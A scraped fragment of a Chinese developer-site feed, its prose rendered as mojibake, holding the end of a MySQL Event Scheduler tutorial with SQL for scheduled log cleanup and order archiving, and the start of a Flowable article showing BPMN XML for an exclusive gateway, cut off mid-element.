<span class="hljs-number">123</span>
</code></pre>
<h4 data-id="heading-5"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>æŸ¥çœ‹ä»»åŠ¡</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> EVENTS;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">1</span>
</code></pre>
<hr/>
<h2 data-id="heading-6"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4. MySQL å®šæ—¶ä»»åŠ¡ vsÂ Quartzã€Cron</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8c4ab614b3549938f717ec76a0be6e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596208&amp;x-signature=e1YTKT57skuArtTpu2TosCv8LGA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>









































<table><thead><tr><th>ç‰¹æ€§</th><th>MySQL Event Scheduler</th><th>Quartz</th><th>Cron</th></tr></thead><tbody><tr><td>éƒ¨ç½²æ–¹å¼</td><td>å†…ç½®æ•°æ®åº“ï¼Œæ— éœ€é¢å¤–å®‰è£…</td><td>Javaåº“ï¼Œéœ€è¦é›†æˆåˆ°é¡¹ç›®ä¸­</td><td>ç³»ç»Ÿçº§ä»»åŠ¡è°ƒåº¦å™¨</td></tr><tr><td>è¡¨è¾¾å¼çµæ´»åº¦</td><td>æ”¯æŒç®€å•çš„Â <code>EVERY</code>/<code>AT</code></td><td>æ”¯æŒå¤æ‚çš„ Cron è¡¨è¾¾å¼</td><td>æ ‡å‡† Cron è¡¨è¾¾å¼</td></tr><tr><td>å¯é æ€§</td><td>ä¾èµ–æ•°æ®åº“</td><td>ä¾èµ–åº”ç”¨æœåŠ¡</td><td>ä¾èµ–æ“ä½œç³»ç»Ÿ</td></tr><tr><td>å¯ç›‘æ§æ€§</td><td>æ— å†…ç½®ç›‘æ§ï¼Œéœ€æ‰‹å·¥è®°å½•</td><td>æä¾› Listener/æ—¥å¿—</td><td>å¯é€šè¿‡æ—¥å¿—æŸ¥çœ‹</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>æ•°æ®æ¸…ç†ã€å½’æ¡£ã€ç»Ÿè®¡</td><td>ä¼ä¸šçº§å¤æ‚ä»»åŠ¡è°ƒåº¦</td><td>ç³»ç»Ÿä»»åŠ¡ï¼Œå¦‚è„šæœ¬æ‰§è¡Œ</td></tr></tbody></table>
<p><strong>ä½¿ç”¨å»ºè®®ï¼š</strong></p>
<blockquote>
<p>å¦‚æœåªæ˜¯åšÂ <strong>æ•°æ®åº“å†…éƒ¨çš„å°å‹å®šæ—¶æ“ä½œ</strong>ï¼Œç”¨Â <code>MySQL</code>Â å®šæ—¶ä»»åŠ¡å³å¯ã€‚<br/>
å¦‚æœéœ€è¦Â <strong>åˆ†å¸ƒå¼ã€å¤æ‚è°ƒåº¦ã€ç›‘æ§å‘Šè­¦</strong>ï¼Œ<code>Quartzã€xxl-job</code>Â æ›´åˆé€‚ã€‚<br/>
å¦‚æœæ˜¯Â <strong>ç³»ç»Ÿå±‚é¢çš„è„šæœ¬</strong>ï¼Œå¯ä»¥äº¤ç»™Â <code>Cron</code>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-7"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5. å®æˆ˜ï¼šä½¿ç”¨ MySQL å®šæ—¶ä»»åŠ¡æ¸…ç†è¿‡æœŸæ—¥å¿—</h2>
<p>å‡è®¾æœ‰ä¸€ä¸ªæ—¥å¿—è¡¨Â <code>user_logs</code>ï¼Œæˆ‘ä»¬å¸Œæœ›æ¯å¤©å‡Œæ™¨è‡ªåŠ¨æ¸…ç† 30 å¤©å‰çš„æ—¥å¿—</p>
<h4 data-id="heading-8"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.1 åˆ›å»ºç¤ºä¾‹è¡¨</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_logs (
    id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    user_id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    action <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),
    create_time DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">123456</span>
</code></pre>
<h4 data-id="heading-9"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.2 æ’å…¥æµ‹è¯•æ•°æ®</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> user_logs (user_id, action, create_time)
<span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'login'</span>, NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">40</span> <span class="hljs-keyword">DAY</span>),
       (<span class="hljs-number">2</span>, <span class="hljs-string">'logout'</span>, NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">10</span> <span class="hljs-keyword">DAY</span>),
       (<span class="hljs-number">3</span>, <span class="hljs-string">'update_profile'</span>, NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">35</span> <span class="hljs-keyword">DAY</span>);

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">1234</span>
</code></pre>
<h4 data-id="heading-10"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.3 åˆ›å»ºå®šæ—¶ä»»åŠ¡</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EVENT IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> clean_user_logs
<span class="hljs-keyword">ON</span> SCHEDULE <span class="hljs-keyword">EVERY</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>
STARTS <span class="hljs-type">TIMESTAMP</span>(<span class="hljs-built_in">CURRENT_DATE</span> <span class="hljs-operator">+</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>)  <span class="hljs-comment">-- ä»æ˜å¤©å‡Œæ™¨å¼€å§‹</span>
DO
  <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> user_logs <span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&lt;</span> NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">30</span> <span class="hljs-keyword">DAY</span>;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">12345</span>
</code></pre>
<h4 data-id="heading-11"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.4 éªŒè¯æ‰§è¡Œæ•ˆæœ</h4>
<p>æ‰‹åŠ¨æ‰§è¡Œä¸€æ¬¡åˆ é™¤é€»è¾‘æ¥æµ‹è¯•ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> user_logs <span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&lt;</span> NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">30</span> <span class="hljs-keyword">DAY</span>;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">1</span>
</code></pre>
<p>ç„¶åè§‚å¯Ÿè¡¨ä¸­æ˜¯å¦åªä¿ç•™è¿‘ 30 å¤©çš„è®°å½•</p>
<hr/>
<h2 data-id="heading-12"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6 å®æˆ˜ï¼šæ¯æ—¥è®¢å•æ•°æ®å½’æ¡£</h2>
<p>æ¯å¤©å‡Œæ™¨3ç‚¹å°†è¶…è¿‡30å¤©çš„è®¢å•æ•°æ®å½’æ¡£åˆ°Â <code>orders_archive</code>Â è¡¨ï¼Œå¹¶åˆ é™¤åŸè¡¨æ•°æ®ã€‚</p>
<h4 data-id="heading-13"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.1 åˆ›å»ºå½’æ¡£è¡¨</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders_archive <span class="hljs-keyword">LIKE</span> orders;
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> orders_archive <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">COLUMN</span> archive_time DATETIME;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">12</span>
</code></pre>
<h4 data-id="heading-14"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.2 åˆ›å»ºäº‹ä»¶</h4>
<pre><code class="hljs language-sql" lang="sql">DELIMITER $$

<span class="hljs-keyword">CREATE</span> EVENT daily_orders_cleanup
<span class="hljs-keyword">ON</span> SCHEDULE
    <span class="hljs-keyword">EVERY</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span> 
    STARTS <span class="hljs-built_in">CURRENT_DATE</span> <span class="hljs-operator">+</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span> <span class="hljs-operator">+</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">3</span> <span class="hljs-keyword">HOUR</span> <span class="hljs-comment">-- æ¬¡æ—¥å‡Œæ™¨3ç‚¹</span>
<span class="hljs-keyword">ON</span> COMPLETION PRESERVE
ENABLE
DO
<span class="hljs-keyword">BEGIN</span>
    <span class="hljs-comment">-- å½’æ¡£æ—§æ•°æ®</span>
    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders_archive 
    <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span>, NOW() <span class="hljs-keyword">FROM</span> orders 
    <span class="hljs-keyword">WHERE</span> order_date <span class="hljs-operator">&lt;</span> CURDATE() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">30</span> <span class="hljs-keyword">DAY</span>;
    
    <span class="hljs-comment">-- åˆ é™¤å·²å½’æ¡£æ•°æ®</span>
    <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> orders 
    <span class="hljs-keyword">WHERE</span> order_date <span class="hljs-operator">&lt;</span> CURDATE() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">30</span> <span class="hljs-keyword">DAY</span>;
<span class="hljs-keyword">END</span>$$

DELIMITER ;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">123456789101112131415161718192021</span>
</code></pre>
<h4 data-id="heading-15"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.3 éªŒè¯äº‹ä»¶çŠ¶æ€</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥çœ‹æ‰€æœ‰äº‹ä»¶</span>
<span class="hljs-keyword">SHOW</span> EVENTS;

<span class="hljs-comment">-- æ£€æŸ¥äº‹ä»¶æœ€åæ‰§è¡Œæ—¶é—´</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.events 
<span class="hljs-keyword">WHERE</span> event_name <span class="hljs-operator">=</span> <span class="hljs-string">'daily_orders_cleanup'</span>;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">123456</span>
</code></pre>
<h4 data-id="heading-16"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.4 æ‰‹åŠ¨æµ‹è¯•äº‹ä»¶</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç«‹å³æµ‹è¯•äº‹ä»¶</span>
<span class="hljs-keyword">ALTER</span> EVENT daily_orders_cleanup ENABLE;
<span class="hljs-keyword">CALL</span> mysql.rds_run_event(<span class="hljs-string">'daily_orders_cleanup'</span>);

<span class="hljs-comment">-- æŸ¥çœ‹æ‰§è¡Œæ—¥å¿—ï¼ˆéœ€å¼€å¯é€šç”¨æ—¥å¿—ï¼‰</span>
<span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'general_log'</span>;

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">123456</span>
</code></pre>
<hr/>
<h2 data-id="heading-17"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>7. æ€»ç»“</h2>
<p><code>MySQL</code>å®šæ—¶ä»»åŠ¡ æä¾›äº†ä¸€ç§å¿«é€Ÿã€è½»é‡åŒ–çš„è°ƒåº¦æ–¹å¼ï¼Œç‰¹åˆ«é€‚åˆÂ <strong>æ•°æ®æ¸…ç†ã€å½’æ¡£ã€ç»Ÿè®¡</strong>Â ç­‰æ•°æ®åº“å†…éƒ¨æ“ä½œã€‚<br/>
å®ƒå¯ä»¥å‡å°‘å¯¹å¤–éƒ¨ä»»åŠ¡è°ƒåº¦æ¡†æ¶çš„ä¾èµ–ï¼Œåœ¨ä¸€äº›ä¸­å°å‹é¡¹ç›®ä¸­éå¸¸å®ç”¨ã€‚<br/>
ä½†åœ¨å¤æ‚è°ƒåº¦ã€åˆ†å¸ƒå¼ä»»åŠ¡ã€å¯è§†åŒ–ç›‘æ§ç­‰æ–¹é¢ï¼Œå®ƒä¸å¦‚Â <code>Quartzã€xxl-job</code>Â ç­‰ä¸“ä¸šå·¥å…·ã€‚</p>
<p><strong>å»ºè®®ä½¿ç”¨åœºæ™¯ï¼š</strong><br/>
è½»é‡çº§ä»»åŠ¡ï¼šå®šæ—¶åˆ é™¤ã€å½’æ¡£ã€ç»Ÿè®¡ã€‚<br/>
å•æœºæ•°æ®åº“ï¼šå¯¹é«˜å¯ç”¨å’Œä»»åŠ¡ç›‘æ§è¦æ±‚ä¸é«˜çš„é¡¹ç›®ã€‚<br/>
ä¸´æ—¶éœ€æ±‚ï¼šå¿«é€Ÿä¸Šçº¿ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ—¶ã€‚</p>
<p>é€šè¿‡æœ¬æ–‡ç›¸ä¿¡å°ä¼™ä¼´ä»¬å·²æŒæ¡<code>MySQL</code>äº‹ä»¶çš„æ ¸å¿ƒç”¨æ³•åŠå…¶é€‚ç”¨åœºæ™¯ã€‚å¯¹äºç®€å•çš„æ•°æ®åº“ç»´æŠ¤ä»»åŠ¡ï¼ŒåŸç”Ÿäº‹ä»¶æ˜¯é«˜æ•ˆçš„é€‰æ‹©ï¼›è€Œæ¶‰åŠä¸šåŠ¡é€»è¾‘çš„å¤æ‚è°ƒåº¦ï¼ŒQuartzç­‰ä¸“ä¸šæ¡†æ¶ä»æ˜¯é¦–é€‰ã€‚æ ¹æ®å®é™…åœºæ™¯åˆç†é€‰æ‹©æŠ€æœ¯æ–¹æ¡ˆï¼Œæ‰èƒ½æœ€å¤§åŒ–ç³»ç»Ÿæ•ˆèƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€flowableä¸“æ ã€‘ç½‘å…³ç±»å‹]]></title>    <link>https://juejin.cn/post/7588934987509694491</link>    <guid>https://juejin.cn/post/7588934987509694491</guid>    <pubDate>2025-12-29T07:16:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588934987509694491" data-draft-id="7588711557499682866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€flowableä¸“æ ã€‘ç½‘å…³ç±»å‹"/> <meta itemprop="keywords" content="åç«¯,å·¥ä½œæµå¼•æ“"/> <meta itemprop="datePublished" content="2025-12-29T07:16:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°èœé¸¡ps"/> <meta itemprop="url" content="https://juejin.cn/user/3679417519061751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€flowableä¸“æ ã€‘ç½‘å…³ç±»å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3679417519061751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°èœé¸¡ps
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:16:20.000Z" title="Mon Dec 29 2025 07:16:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.æ’ä»–ç½‘å…³ï¼ˆExclusive Gatewayï¼‰</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d47eb2e788ab4f76926f2c3740bf713c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6I-c6bihcHM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598307&amp;x-signature=uwO20zHQ0QXmR0XjywWFNfQrXEc%3D" alt="image.png" loading="lazy"/>
è¿™ä¸ªå¯ä»¥è¯´æ˜¯æˆ‘ä»¬æœ€æœ€æœ€å¸¸ç”¨çš„ä¸€ä¸ªç½‘å…³äº†ï¼Œå®é™…ä¸Šå¯ä»¥ç†è§£ä¸ºif-elseã€‚</p>
<p>å¸¸è§åœºæ™¯ï¼šé‡‘é¢æŠ¥é”€</p>
<p>æ³¨æ„ï¼šæ¡ä»¶å¯ä»¥æœ‰å¤šä¸ªï¼Œä½†æ˜¯ä¸ºtrueçš„æƒ…å†µå¿…é¡»è¦æœ‰ä¸”åªèƒ½æœ‰ä¸€ä¸ªï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p>
<p>å»ºè®®ï¼šæ·»åŠ ä¸€ä¸ªé»˜è®¤çš„è·¯å¾„ï¼Œé˜²æ­¢å…¨falseçš„æƒ…å†µã€‚</p>
<p>ä¾‹å­ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">process</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow_fxbn4kjb"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"flow_mdrr27se"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">startEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"start_event"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å¼€å§‹"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0dso2ii<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">startEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ‰¹äººA"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_0dso2ii<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_1h46vbf<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0dso2ii"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"start_event"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusiveGateway</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"æ’æ–¥ç½‘å…³"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_1h46vbf<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_09abes7<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0xb14rh<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusiveGateway</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1h46vbf"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_1b7dkwh"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_1ugsmv9"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å®¡æ ¸äººB"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">incoming</span>&gt;</span>Flow_09abes7<span class="hljs-tag">&lt;/<span class="hljs-name">incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">outgoing</span>&gt;</span>Flow_0guuy54<span class="hljs-tag">&lt;/<span class="hljs-name">outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_09abes7"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Gateway_0gs8sp7"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_1ugsmv9"</span>&gt;</span>
